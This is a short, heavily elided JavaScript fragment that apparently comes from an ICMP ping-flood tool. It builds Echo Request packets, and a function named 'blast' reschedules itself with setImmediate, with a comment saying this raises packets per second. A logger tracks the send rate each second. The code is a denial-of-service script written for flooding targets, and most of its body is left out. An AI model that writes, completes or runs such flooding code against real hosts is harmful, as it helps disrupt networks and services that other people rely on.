...
const createPacket = () => {
    ...
    buffer.writeUInt8(8, 0);  // ICMP Echo Request (ping)
    buffer.writeUInt8(0, 1);  // Code 0
    buffer.writeUInt16BE(0, 2);  // Checksum placeholder
    buffer.writeUInt16BE(process.pid & 0xffff, 4);  // PID
...
const blast = () => {
    ...
    // Make the loop fire faster to increase PPS
    setImmediate(blast);
};

// Aggressive packet rate logging
setInterval(() => {
...
}, 1000);  // Faster interval for more granular tracking
